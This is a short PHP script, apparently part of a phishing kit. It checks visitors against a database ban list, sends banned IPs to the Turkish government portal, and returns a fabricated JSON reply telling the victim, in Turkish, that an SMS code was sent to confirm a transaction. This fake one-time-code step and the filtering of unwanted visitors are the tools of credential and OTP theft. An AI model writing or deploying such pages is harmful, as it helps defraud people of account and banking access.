<?php
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');
    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol) {
        if($kontrol['ban'] == $ip) {
            header('Location:http://www.turkiye.gov.tr');
        }
    }

print_r(json_encode([
	'detailText' => null,
	'forRestriction' => false,
	'isRedirect' => false,
	'isSuccess' => true,
	'message' => null,
	'remainingSeconds' => 291,
	'status' => 0,
	'token' => null,
	'type' => "SMS",
	'text' => "Cep Telefonunuza bir kod gönderdik. Bilgileri kontrol ederek işlemi onaylayabilirsiniz."
]));

?>